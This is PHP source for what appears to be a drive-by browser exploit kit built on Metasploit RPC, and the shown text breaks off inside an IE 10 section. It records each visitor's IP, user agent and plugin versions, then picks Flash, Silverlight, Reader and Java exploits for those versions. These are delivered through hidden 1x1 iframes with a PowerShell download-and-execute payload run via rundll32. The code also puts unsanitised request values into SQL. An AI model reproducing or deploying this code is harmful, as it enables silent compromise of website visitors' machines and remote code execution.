<?php
  require_once ('m/includes/config.inc.php');
  require_once ('e/php_debug_inc.php');
  require_once ('e/php_msfrpc_inc.php');
  
  $throw_count_be = 0;
  
  if(THROW_COUNT == 'no')
  {
    $throw_count_total = intval(0);
  }
  else
  {
    $throw_count_total = intval(THROW_COUNT);
  }
  
  debug("START BE");
  
  function throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn)
  {
    //$innerReturn = '';
    
    debug("GLOBALS['throw_count_be']: " . $GLOBALS['throw_count_be'] );
    debug("GLOBALS['throw_count_total']: " . $GLOBALS['throw_count_total'] );
    
    if  ($GLOBALS['throw_count_be'] < $GLOBALS['throw_count_total'] )
    {
      require_once (MYSQL);
      
      $php_date = date("m.d.y");
      $php_time = date("H:i:s");
      
      $q = "INSERT INTO throws (" .
      "hit_id, php_date, php_time, " .
      "msf_exploit_full_path, msf_target" .
      ") VALUES (" .
      "'$hit_id', '$php_date', '$php_time', ".
      "'$msf_exploit_full_path', '$msf_target')";
      
      $r = mysqli_query ($dbc, $q) or trigger_error("Query: $q\n<br />MySQL Error: " . mysqli_error($dbc));
      if (mysqli_affected_rows($dbc) == 1)
      {
        // INSERT works
        $throw_id = mysqli_insert_id($dbc);
      }
      else
      {
        // INSERT failed
        $throw_id = NULL;
      }
      
      if (isset($throw_id))
      {
		  $load_file_path = '/var/www/'. $throw_id;
		  $load_url = WL_URL . "/". $throw_id;
        #$load_file_path = '/var/www/'. RAND_STR . '-' . $throw_id;
        #$load_url = WL_URL . "/" .  RAND_STR . '-' . $throw_id;
      }
      else
      {
		$load_file_path = '/var/www/PSp';
		$load_url = WL_URL . "/Psp";
        #$load_file_path = '/var/www/'. RAND_STR . '-p';
        #$load_url = WL_URL . "/" . RAND_STR . '-p';
      }
      
      $load_file_data = "<?php define ('THROW_ID', '" . $throw_id . "'); ?>\n";
      
      $load_file_data .= file_get_contents('/var/www/e/template-p.php');
      
      $load_file_data .= LOAD_PS_PAYLOAD;
      
      file_put_contents($load_file_path, $load_file_data);
      
      debug("load_url: " . $load_url);
      $msf_cmd_option = $msf_cmd_option_one . $load_url . $msf_cmd_option_two;
      debug("msf_cmd_option: " . $msf_cmd_option);

		$msf_exploit_name = substr(strrchr($msf_exploit_full_path, "/"), 1 );
		#$msf_uripath = $hit_id . $msf_exploit_name;
		$msf_uripath = $hit_id;

      $msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option, $msf_uripath);
      $innerReturn = $innerReturn . throw_iframe($msf_url);
      
      $GLOBALS['throw_count_be'] = $GLOBALS['throw_count_be'] + 1;
    }
    return $innerReturn;
  }
  
  function throw_iframe($url)
  {
    if(!DEBUG_FLAG)
    {
      return 'document.body.innerHTML += \'<iframe src="'.$url.'" frameBorder="0" seamless="seamless" scrolling="no" style="width:1px;height:1px;" height="0" width="0"></iframe>\';';
      /*
      return 'document.body.innerHTML += \'<iframe src="'.$url.'" frameborder="0"></iframe></br> \';
      ';
      */
      /*
      return 'document.body.innerHTML += \'<iframe src="'.$url.'" style="border:none;width:1px;height:1px;display:none;visibility:hidden" height="0" width="0" border="0"></iframe></br> \';
      ';
      */
    }
    else
    {
      return 'document.body.innerHTML += \'<iframe src="'.$url.'""></iframe></br> \';
      ';
    }
  }
  
  function get_os_info($http_user_agent)
  {
	  $os_family = "unknown";
	  $os_version = "unknown";
	  $os_platform = "unknown";
	  $browser_wow64 = "unknown";
      
	  if (preg_match('/linux/i', $http_user_agent))
	  {
		  $os_family = 'linux';
	  }
	  elseif (preg_match('/macintosh|mac os x/i', $http_user_agent))
	  {
	    
	    $os_family = 'mac';
	    
	    if (preg_match('/Intel Mac OS X 10_9_4/i', $http_user_agent))
	    {
		$os_version = '10.9.4';
	    }
	    elseif(preg_match('/Intel Mac OS X 10_9_3/i', $http_user_agent))
	    {
		$os_version = '10.9.3';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_9_2/i', $http_user_agent))
	    {
		$os_version = '10.9.2';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_9_1/i', $http_user_agent))
	    {
		$os_version = '10.9.1';
	    }
	    elseif(preg_match('/Intel Mac OS X 10_9/i', $http_user_agent))
	    {
		$os_version = '10.9';
	    }
	    elseif(preg_match('/Intel Mac OS X 10_8_5/i', $http_user_agent))
	    {
		$os_version = '10.8.5';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_8_4/i', $http_user_agent))
	    {
		$os_version = '10.8.4';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_8_3/i', $http_user_agent))
	    {
		$os_version = '10.8.3';
	    }
    	    elseif(preg_match('/Intel Mac OS X 10_8_2/i', $http_user_agent))
	    {
		$os_version = '10.8.2';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_8_1/i', $http_user_agent))
	    {
		$os_version = '10.8.1';
	    }
	    elseif(preg_match('/Intel Mac OS X 10_8/i', $http_user_agent))
	    {
		$os_version = '10.8';
	    }
	    elseif(preg_match('/Intel Mac OS X 10_7_5/i', $http_user_agent))
	    {
		$os_version = '10.7.5';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_7_4/i', $http_user_agent))
	    {
		$os_version = '10.7.4';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_7_3/i', $http_user_agent))
	    {
		$os_version = '10.7.3';
	    }
    	    elseif(preg_match('/Intel Mac OS X 10_7_2/i', $http_user_agent))
	    {
		$os_version = '10.7.2';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_7_1/i', $http_user_agent))
	    {
		$os_version = '10.7.1';
	    }
	    elseif(preg_match('/Intel Mac OS X 10_7/i', $http_user_agent))
	    {
		$os_version = '10.7';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_6_8/i', $http_user_agent))
	    {
		$os_version = '10.6.8';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_6_7/i', $http_user_agent))
	    {
		$os_version = '10.6.7';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_6_6/i', $http_user_agent))
	    {
		$os_version = '10.6.6';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_6_5/i', $http_user_agent))
	    {
		$os_version = '10.6.5';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_6_4/i', $http_user_agent))
	    {
		$os_version = '10.6.4';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_6_3/i', $http_user_agent))
	    {
		$os_version = '10.6.3';
	    }
    	    elseif(preg_match('/Intel Mac OS X 10_6_2/i', $http_user_agent))
	    {
		$os_version = '10.6.2';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_6_1/i', $http_user_agent))
	    {
		$os_version = '10.6.1';
	    }
	    elseif(preg_match('/Intel Mac OS X 10_6/i', $http_user_agent))
	    {
		$os_version = '10.6';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_5_8/i', $http_user_agent))
	    {
		$os_version = '10.5.8';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_5_7/i', $http_user_agent))
	    {
		$os_version = '10.5.7';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_5_6/i', $http_user_agent))
	    {
		$os_version = '10.5.6';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_5_5/i', $http_user_agent))
	    {
		$os_version = '10.5.5';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_5_4/i', $http_user_agent))
	    {
		$os_version = '10.5.4';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_5_3/i', $http_user_agent))
	    {
		$os_version = '10.5.3';
	    }
    	    elseif(preg_match('/Intel Mac OS X 10_5_2/i', $http_user_agent))
	    {
		$os_version = '10.5.2';
	    }
  	    elseif(preg_match('/Intel Mac OS X 10_5_1/i', $http_user_agent))
	    {
		$os_version = '10.5.1';
	    }
	    elseif(preg_match('/Intel Mac OS X 10_5/i', $http_user_agent))
	    {
		$os_version = '10.5';
	    }
	  }
	  elseif (preg_match('/windows|win32/i', $http_user_agent))
	  {
		  $os_family = 'windows';
		  
		  if (preg_match('/windows nt 6.3/i', $http_user_agent))
		  {
		      $os_version = '8.1';
		  }
		  elseif(preg_match('/windows nt 6.2/i', $http_user_agent))
		  {
		      $os_version = '8';
		  }
		  elseif(preg_match('/windows nt 6.1/i', $http_user_agent))
		  {
		      $os_version = '7';
		  }
		  elseif(preg_match('/windows nt 6.0/i', $http_user_agent))
		  {
		      $os_version = 'Vista';
		  }
		  elseif(preg_match('/windows nt 5.2/i', $http_user_agent))
		  {
		      $os_version = 'XP';
		  }
		  elseif(preg_match('/windows nt 5.1/i', $http_user_agent))
		  {
		      $os_version = 'XP';
		  }
		  elseif(preg_match('/windows nt 5.0/i', $http_user_agent))
		  {
		      $os_version = '2000';
		  }
			      
		  if(preg_match('/wow64/i', $http_user_agent))
		  {
			  $os_platform = 'x64';
			  $browser_wow64 = 'yes';
		  }
		  elseif(preg_match('/win64/i', $http_user_agent))
		  {
			  $os_platform = 'x64';
			  $browser_wow64 = 'no';
		  }
		  elseif(preg_match('/x64/i', $http_user_agent))
		  {
			  $os_platform = 'x64';
			  $browser_wow64 = 'no';
		  }
		  else
		  {
			  $os_platform = 'x86';
			  $browser_wow64 = 'no';
		  }
	  }
  
	  return array(
		  'family'      => $os_family,
		  'version'   => $os_version,
		  'platform'   => $os_platform,
		  'wow64'   => $browser_wow64
	  );
  }
  
  function get_browser_info($http_user_agent)
  {
	  $browser_name = "unknown";
	  $browser_version = "unknown";
	  $ub = "unknown";
      
	  if(preg_match('/MSIE|rv:11/i',$http_user_agent) && !preg_match('/Opera/i',$http_user_agent)) 
	  { 
		  $browser_name = 'Internet Explorer'; 
		  
		  if(preg_match('/rv:11/i',$http_user_agent)) 
		  { 
		      $browser_version = '11'; 
		  } 
		  elseif(preg_match('/MSIE 10/i',$http_user_agent)) 
		  { 
		      $browser_version = '10'; 
		  }
		  elseif(preg_match('/MSIE 9/i',$http_user_agent)) 
		  { 
		      $browser_version = '9'; 
		  } 
		  elseif(preg_match('/MSIE 8/i',$http_user_agent)) 
		  { 
		      $browser_version = '8'; 
		  }
		  elseif(preg_match('/MSIE 7/i',$http_user_agent)) 
		  { 
		      $browser_version = '7'; 
		  }
		  elseif(preg_match('/MSIE 6/i',$http_user_agent)) 
		  { 
		      $browser_version = '6'; 
		  }
	  }
	  elseif(preg_match('/Firefox/i',$http_user_agent)) 
	  { 
	      $browser_name = 'Mozilla Firefox'; 
	      $ub = "Firefox"; 
	  } 
	  elseif(preg_match('/Chrome/i',$http_user_agent)) 
	  { 
	      $browser_name = 'Google Chrome'; 
	      $ub = "Chrome"; 
	  } 
	  elseif(preg_match('/Safari/i',$http_user_agent)) 
	  { 
	      $browser_name = 'Apple Safari'; 
	      $ub = "Safari"; 
	  } 
	  elseif(preg_match('/Opera/i',$http_user_agent)) 
	  { 
	      $browser_name = 'Opera'; 
	      $ub = "Opera"; 
	  } 
	  elseif(preg_match('/Netscape/i',$http_user_agent)) 
	  { 
	      $browser_name = 'Netscape'; 
	      $ub = "Netscape"; 
	  } 
	  
	  try {
	    if (strcmp($browser_version, "unknown") == 0 )
	    {
		    // finally get the correct version number
		    $known = array('Version', $ub, 'other');
		    $pattern = '#(?<browser>' . join('|', $known) .
		    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
		    if (!preg_match_all($pattern, $http_user_agent, $matches))
		    {
			    // we have no matching number just continue
		    }
	    
		    // see how many we have
		    $i = count($matches['browser']);
		    if ($i != 1)
		    {
			    //we will have two since we are not using 'other' argument yet
			    //see if version is before or after the name
			    if (strripos($http_user_agent,"Version") < strripos($http_user_agent,$ub))
			    {
				    $browser_version= $matches['version'][0];
			    }
			    else
			    {
				    $browser_version= $matches['version'][1];
			    }
		    }
		    else
		    {
			    $browser_version= $matches['version'][0];
		    }
		    // check if we have a number
		    if ($browser_version==null || $browser_version=="") {$browser_version="?";}
	    }
	  }
	  catch (Exception $e)
	  {
	    $browser_version = "unknown";
	    
	    
	  }
	  
	  return array(
		  'name'      => $browser_name,
		  'version'   => $browser_version
	  );
  }



  if ($_SERVER['REQUEST_METHOD'] === 'POST') 
  {
    
    // --- ### php collected info ### ---
    $php_date = date("m.d.y");
    $php_time = date("H:i:s");
    $php_remote_addr = $_SERVER['REMOTE_ADDR'];
    $php_http_referer = $_SERVER['HTTP_REFERER'];
    $php_http_user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    if(isset($_REQUEST['http_referer']))
    {
      $php_http_referer = base64_decode($_REQUEST['http_referer']);
    }
    
    $ua_os_family = "unknown";
    $ua_os_version = "unknown";
    $ua_os_platform = "unknown";
    $ua_browser_wow64 = "unknown";
    $ua_browser_name = "unknown";
    $ua_browser_version = "unknown";
    
    $ua_os_info = get_os_info($php_http_user_agent);
    $ua_os_family = $ua_os_info['family'];
    $ua_os_version = $ua_os_info['version'];
    $ua_os_platform = $ua_os_info['platform'];
    $ua_browser_wow64 = $ua_os_info['wow64'];
    
    $ua_browser_info = get_browser_info($php_http_user_agent);
    $ua_browser_name = $ua_browser_info['name'];
    $ua_browser_version = $ua_browser_info['version'];

    $me_mshtml_build = "unknown";
    
    if(isset($_REQUEST['me_mshtml_build']))
    {
      $me_mshtml_build = $_REQUEST['me_mshtml_build'];
    }
    
    $be_office = "unknown";
    
    if(isset($_REQUEST['be_office']))
    {
      $be_office = $_REQUEST['be_office'];
    }
    
    $pd_os = "unknown";
    $pd_br = "unknown";
    $pd_br_ver = "unknown";
    $pd_br_ver_full = "unknown";
    $pd_reader = "unknown";
    $pd_flash = "unknown";
    $pd_java = "unknown";
    $pd_qt = "unknown";
    $pd_rp = "unknown";
    $pd_shock = "unknown";
    $pd_silver = "unknown";
    $pd_wmp = "unknown";
    $pd_vlc = "unknown";
    
    $pd_br_ver_major = -1;
    $pd_br_ver_minor = -1;
    $pd_br_ver_build = -1;
    $pd_br_ver_update = -1;
    
    $pd_flash_major = -1;
    $pd_flash_minor = -1;
    $pd_flash_build = -1;
    $pd_flash_update = -1;
    
    $pd_java_major = -1;
    $pd_java_minor = -1;
    $pd_java_build = -1;
    $pd_java_update = -1;
    
    $pd_reader_major = -1;
    $pd_reader_minor = -1;
    $pd_reader_build = -1;
    $pd_reader_update = -1;
    
    $pd_qt_major = -1;
    $pd_qt_minor = -1;
    $pd_qt_build = -1;
    $pd_qt_update = -1;
    
    $pd_silver_major = -1;
    $pd_silver_minor = -1;
    $pd_silver_build = -1;
    $pd_silver_update = -1;
    
    if(isset($_REQUEST['pd_os']))
    {
      $pd_os = $_REQUEST['pd_os'];
    }
    
    if(isset($_REQUEST['pd_br']))
    {
      $pd_br = $_REQUEST['pd_br'];
    }
    
    if(isset($_REQUEST['pd_br_ver']))
    {
      $pd_br_ver = $_REQUEST['pd_br_ver'];
    }
    
    if(isset($_REQUEST['pd_br_ver_full']))
    {
      $pd_br_ver_full = $_REQUEST['pd_br_ver_full'];
      
      $pieces = explode(",", $pd_br_ver_full);
      
      if (isset($pieces[0]))
      {
        $pd_br_ver_major = $pieces[0];
      }
      
      if (isset($pieces[1]))
      {
        $pd_br_ver_minor = $pieces[1];
      }
      
      if (isset($pieces[2]))
      {
        $pd_br_ver_build = $pieces[2];
      }
      
      if (isset($pieces[3]))
      {
        $pd_br_ver_update = $pieces[3];
      }
    }
    
    if(isset($_REQUEST['reader']))
    {
      $pd_reader = $_REQUEST['reader'];
      
      $pieces = explode(",", $pd_reader);
      
      if (isset($pieces[0]))
      {
	$pd_reader_major = $pieces[0];
      }
      
      if (isset($pieces[1]))
      {
	$pd_reader_minor = $pieces[1];
      }
      
      if (isset($pieces[2]))
      {
	$pd_reader_build = $pieces[2];
      }
      
      if (isset($pieces[3]))
      {
	$pd_reader_update = $pieces[3];
      }
    }
    
    if(isset($_REQUEST['flash']))
    {
      $pd_flash = $_REQUEST['flash'];
      
      $pieces = explode(",", $pd_flash);
      
      if (isset($pieces[0]))
      {
	$pd_flash_major = $pieces[0];
      }
      
      if (isset($pieces[1]))
      {
	$pd_flash_minor = $pieces[1];
      }
      
      if (isset($pieces[2]))
      {
	$pd_flash_build = $pieces[2];
      }
      
      if (isset($pieces[3]))
      {
	$pd_flash_update = $pieces[3];
      }
      
    }
    
    if(isset($_REQUEST['java']))
    {
      $pd_java = $_REQUEST['java'];
      
      $pieces = explode(",", $pd_java);
      
      if (isset($pieces[0]))
      {
	$pd_java_major = $pieces[0];
      }
      
      if (isset($pieces[1]))
      {
	$pd_java_minor = $pieces[1];
      }
      
      if (isset($pieces[2]))
      {
	$pd_java_build = $pieces[2];
      }
      
      if (isset($pieces[3]))
      {
	$pd_java_update = $pieces[3];
      }
    }
    
    if(isset($_REQUEST['qt']))
    {
      $pd_qt = $_REQUEST['qt'];
      
      try{
	$pieces = explode(",", $pd_qt);
	
	if (isset($pieces[0]))
	{
	  $pd_qt_major = $pieces[0];
	}
	
	if (isset($pieces[1]))
	{
	  $pd_qt_minor = $pieces[1];
	}
	
	if (isset($pieces[2]))
	{
	  $pd_qt_build = $pieces[2];
	}
	
	if (isset($pieces[3]))
	{
	  $pd_qt_update = $pieces[3];
	}
      }
      catch (Exception $e)
      {
	$pd_qt_major = -1;
	$pd_qt_minor = -1;
	$pd_qt_build = -1;
	$pd_qt_update = -1;
      }
    }
    
    if(isset($_REQUEST['rp']))
    {
      $pd_rp = $_REQUEST['rp'];
    }
    
    if(isset($_REQUEST['shock']))
    {
      $pd_shock = $_REQUEST['shock'];
    }
    
    if(isset($_REQUEST['silver']))
    {
      $pd_silver = $_REQUEST['silver'];
      
      try{
	$pieces = explode(",", $pd_silver);
	
	if (isset($pieces[0]))
	{
	  $pd_silver_major = $pieces[0];
	}
	
	if (isset($pieces[1]))
	{
	  $pd_silver_minor = $pieces[1];
	}
	
	if (isset($pieces[2]))
	{
	  $pd_silver_build = $pieces[2];
	}
	
	if (isset($pieces[3]))
	{
	  $pd_silver_update = $pieces[3];
	}
      }
      catch (Exception $e)
      {
	$pd_silver_major = -1;
	$pd_silver_minor = -1;
	$pd_silver_build = -1;
	$pd_silver_update = -1;
      }
      
    }
    
    if(isset($_REQUEST['wmp']))
    {
      $pd_wmp = $_REQUEST['wmp'];
    }
    
    if(isset($_REQUEST['vlc']))
    {
      $pd_vlc = $_REQUEST['vlc'];
    }
    
    require_once (MYSQL);
    //require (MYSQL);

    $q = "INSERT INTO hits (" .
    "php_date, php_time, php_remote_addr, php_http_referer, php_http_user_agent, " .
    "ua_os_family, ua_os_version, ua_os_platform, ua_browser_wow64, ua_browser_name, ua_browser_version, " .
    "pd_os, pd_br, pd_br_ver, pd_br_ver_full, " .
    "me_mshtml_build, be_office, " .
    "pd_reader, pd_flash, pd_java, pd_qt, pd_rp, pd_shock, pd_silver, pd_wmp, pd_vlc" .
    ") VALUES (" .
    "'$php_date', '$php_time', '$php_remote_addr', '$php_http_referer', '$php_http_user_agent', ".
    "'$ua_os_family', '$ua_os_version', '$ua_os_platform', '$ua_browser_wow64', '$ua_browser_name', '$ua_browser_version', " .
    "'$pd_os', '$pd_br', '$pd_br_ver', '$pd_br_ver_full', " .
    "'$me_mshtml_build', '$be_office', " .
    "'$pd_reader', '$pd_flash', '$pd_java', '$pd_qt', '$pd_rp', '$pd_shock', '$pd_silver', '$pd_wmp', '$pd_vlc')";
    
    $r = mysqli_query ($dbc, $q) or trigger_error("Query: $q\n<br />MySQL Error: " . mysqli_error($dbc));
    if (mysqli_affected_rows($dbc) == 1)
    {
      // INSERT works
      
      //$query = "INSERT INTO myCity VALUES (NULL, 'Stuttgart', 'DEU', 'Stuttgart', 617000)";
      //mysqli_query($link, $query);
      $hit_id = mysqli_insert_id($dbc);
      
      //printf ("New Record has id %d.\n", mysqli_insert_id($link));
    }
    else
    {
      // INSERT failed
      #$hit_id = NULL;
		$hit_id = "unknown";
    }
    //mysqli_free_result($r);
    //mysqli_close($dbc);
    
    debug("BE START Exploitation</br>");
    
    $innerReturn = '';
    
    if( ($ua_os_family == "windows" || $pd_os == "windows") )
    {
      $msf_payload_full_path = "windows/exec";
      
      /*
$msf_cmd_option_one = <<<'EOD'
set CMD rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script>\"+(new%20ActiveXObject(\"WScript.Shell\")).Run(\"powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c IEX ((new-object net.webclient).downloadstring(\'
EOD;
      */
      
$msf_cmd_option_one = <<<'EOD'
set CMD rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(new%20ActiveXObject(\"WScript.Shell\").run(\"powershell.exe -nop -c IEX ((new-object net.webclient).downloadstring(\'
EOD;
    
    /*
    
    rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write(new%20ActiveXObject("WScript.Shell").run("powershell.exe -nop -c IEX ((new-object net.webclient).downloadstring('http://192.168.14.132/a'))",0));
    
    */
    
/*
$msf_cmd_option_two = <<<'EOD'
\'))\"\,0))
EOD;
*/ 
    
$msf_cmd_option_two = <<<'EOD'
\'))\"\,0));
EOD;
      
      //$msf_cmd_option = $msf_cmd_option_one . LOAD_URL . $msf_cmd_option_two;
      //debug("msf_cmd_option:" . $msf_cmd_option);
      
      // ### ### ###
      
      // --- Flash ---
      if ( ( ($pd_flash_major == 11) && ($pd_flash_minor == 7) && ($pd_flash_build <= 700) && ($pd_flash_update < 279) ) ||
	 ( ($pd_flash_major == 11) && ($pd_flash_minor == 8) ) ||
	 ( ($pd_flash_major == 11) && ($pd_flash_minor == 9) ) ||
	 ( ($pd_flash_major == 12) ) ||
	 ( ($pd_flash_major == 13) && ($pd_flash_minor == 0) && ($pd_flash_build == 0) && ($pd_flash_update < 206) )
	)
      {
	  if( ($pd_br == "ie" || $ua_browser_name == "Internet Explorer") )
	  {
	    //before 11.7.700.279 and 11.8.x through 13.0.x before 13.0.0.206 on Windows
	    
	    /*
	     *
	     *          :source  => /script|headers/i,
          :os_name => Msf::OperatingSystems::WINDOWS,
          :ua_name => lambda { |ua| ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF || ua == Msf::HttpClients::SAFARI},
          :flash   => lambda { |ver| ver =~ /^11\./ || ver =~ /^12\./ || (ver =~ /^13\./ && ver <= '13.0.0.182') }
        },

	     */
	    
	    //"pd_br" => "ie",
	    //"ua_browser_name" => "Internet Explorer",
	    
	    //11.7.700.261 and 11.8.x through 12.0.x before 12.0.0.44
	    //exploit/windows/browser/adobe_flash_avm2
	    // msf exploit(adobe_flash_avm2) > use exploit/windows/browser/adobe_flash_avm2 
	    
	    
	    $msf_exploit_full_path = "exploit/windows/browser/adobe_flash_pixel_bender_bof";
	    $msf_target = "0";
	    
	    /*
	    $msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
	    $innerReturn = $innerReturn . throw_iframe($msf_url);
	    */
	    
	    $innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	    
	    
	  }
	
      }
      elseif ( ( ($pd_flash_major == 11) && ($pd_flash_minor == 7) && ($pd_flash_build <= 700) && ($pd_flash_update < 261) ) ||
	   ( ($pd_flash_major == 11) && ($pd_flash_minor == 8) ) ||
	   ( ($pd_flash_major == 11) && ($pd_flash_minor == 9) ) ||
	   ( ($pd_flash_major == 12) && ($pd_flash_minor == 0) && ($pd_flash_build == 0) && ($pd_flash_update < 44) )
	  )
      {
  
	  if( ($pd_br == "ie" || $ua_browser_name == "Internet Explorer") )
	  {
	    //"pd_br" => "ie",
	    //"ua_browser_name" => "Internet Explorer",
	    
	    //11.7.700.261 and 11.8.x through 12.0.x before 12.0.0.44
	    //exploit/windows/browser/adobe_flash_avm2
	    // msf exploit(adobe_flash_avm2) > use exploit/windows/browser/adobe_flash_avm2 
	    
	    
	    $msf_exploit_full_path = "exploit/windows/browser/adobe_flash_avm2";
	    $msf_target = "0";
	    
	    /*
	    $msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
	    $innerReturn = $innerReturn . throw_iframe($msf_url);
	    */
	    
	    $innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	    
	    
	  }
	
      }
      
      // --- Silverlight ---
      if ( ($pd_silver_major == 5) && ($pd_silver_minor <= 1) && ($pd_silver_build < 20125) ) 
      {
	// before 5.1.20125.0
	//$pd_silver_major = -1;
	//$pd_silver_minor = -1;
	//$pd_silver_build = -1;
	//$pd_silver_update = -1;
	
	if( ($pd_br == "ie" || $ua_browser_name == "Internet Explorer") )
	{
	  $msf_exploit_full_path = "exploit/windows/browser/ms13_022_silverlight_script_object";
	  
	  $msf_target = "0";
	  if ( $ua_os_platform == "x64" ) 
	  {
	    $msf_target = "1";
	  }
	  else
	  { // x86
	    $msf_target = "0";
	  }
	  
	  //$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
	  //$innerReturn = $innerReturn . throw_iframe($msf_url);
	  $innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	}
      }
      
      // --- Reader ---
      if ( ( ($pd_reader_major == 9) && ($pd_reader_minor <= 3) && ($pd_reader_build <= 4) ) ||
	   ( ($pd_reader_major == 8) && ($pd_reader_minor <= 2) && ($pd_reader_build <= 4) )
	  )
      {
	$msf_exploit_full_path = "exploit/windows/browser/adobe_cooltype_sing";
	$msf_target = "0";
	//$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
	//$innerReturn = $innerReturn . throw_iframe($msf_url);
	$innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
      }
      
      // --- Quicktime ---
      if ( ( ($pd_qt_major == 7) && ($pd_qt_minor == 6) && ($pd_qt_build == 7) ) ||
	   ( ($pd_qt_major == 7) && ($pd_qt_minor == 6) && ($pd_qt_build == 6) )
	  )
      {
	//7.6.7 7.6.6 ie apple_quicktime_marshaled_punk.rb
	// $pd_qt_major
	//7.7.2 safari apple_quicktime_mime_type.rb
	
	//7.1.3 ie firefox
	
	//7.6.6
	
	//7.7.2 xp only apple_quicktime_texml_font_table.rb
	
	/*
	 *
	 *[ 'Quicktime 7.7.3 with IE 8 on Windows XP SP3', {'Ret' => 0x66923467, 'Nop' => 0x6692346d, 'Pop' => 0x66849239} ],
          [ 'Quicktime 7.7.2 with IE 8 on Windows XP SP3', {'Ret' => 0x669211C7, 'Nop' => 0x669211CD, 'Pop' => 0x668C5B55} ],
          [ 'Quicktime 7.7.1 with IE 8 on Windows XP SP3', {'Ret' => 0x66920D67, 'Nop' => 0x66920D6D, 'Pop' => 0x66849259} ],
          [ 'Quicktime 7.7.0 with IE 8 on Windows XP SP3', {'Ret' => 0x66920BD7, 'Nop' => 0x66920BDD, 'Pop' => 0x668E963A} ]

	 */
	
	if( ($pd_br == "ie" || $ua_browser_name == "Internet Explorer") )
	{
	  $msf_exploit_full_path = "exploit/windows/browser/adobe_cooltype_sing";
	  $msf_target = "0";
	  //$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
	  //$innerReturn = $innerReturn . throw_iframe($msf_url);
	  $innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
	}
      }
      
      // --- Java ---
      
      /*
        $pd_java_major = -1;
	$pd_java_minor = -1;
	$pd_java_build = -1;
	$pd_java_update = -1;
       */
      
      if ( ( ($pd_java_major == 1) && ($pd_java_minor == 7) && ($pd_java_build == 0) && ($pd_java_update <= 15) ) ||
	   ( ($pd_java_major == 1) && ($pd_java_minor == 6) && ($pd_java_build == 0) && ($pd_java_update <= 41) )
	  )
      {
	  $msf_exploit_full_path = "exploit/windows/browser/java_cmm";
	  $msf_target = "1";
	  //$msf_url = use_exploit(MSGRPC_IP, EXPLOIT_DOMAIN, EXPLOIT_PORT, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option);
	  //$innerReturn = $innerReturn . throw_iframe($msf_url);
	  $innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
      }
      
      // ### ### ###
      
      // --- IE ---
      
      if( ($pd_br == "ie" || $ua_browser_name == "Internet Explorer") )
      {
      
      
	// --- IE 11 ---
	
	if( ($ua_browser_version == "11") || ($pd_br_ver == "11") )
	{
	  
	}
	
	// --- IE 10 ---
	
	/*
	 * use exploit/windows/browser/ms14_012_textrange 
	 *   0   Windows 7 SP1 / IE 10 / FP 12
	'Arch'           => ARCH_X86,
   'BrowserRequirements' =>
	  {
	    :source      => /script|headers/i,
	    :os_name     => Msf::OperatingSystems::WINDOWS,
	    :os_flavor   => Msf::OperatingSystems::WindowsVersions::SEVEN,
